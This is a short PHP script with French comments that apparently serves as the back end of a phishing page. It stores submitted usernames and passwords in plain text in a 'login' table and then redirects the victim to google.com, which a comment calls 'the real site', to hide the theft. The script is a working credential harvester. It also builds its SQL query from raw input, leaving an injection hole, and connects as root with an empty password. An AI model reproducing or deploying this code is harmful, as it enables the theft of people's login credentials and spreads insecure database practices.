<?php
  // Définitions des champs username password
  $username=$_POST['username'];
  $password=$_POST['password'];
  
  // Informations d'identification à la BDD
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', '');
  define('DB_NAME', 'database_name');

  // Connexion à la base de données MySQL
  $conn = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

  // Vérifier la connexion
  if($conn === false){
    die("ERREUR : Impossible de se connecter. " . mysqli_connect_error());
  }
  
  // Définir la requête d'insertion
  $query = "INSERT INTO `login` (`id`, `mail`, `password`) VALUES (NULL, '$username', '$password');";
  
  // Exécuter la requête sur la base de données
  $res = mysqli_query($conn, $query);
  
  // Rediriger la personne sur le vrai site
  header("Location: https://google.com")
?>
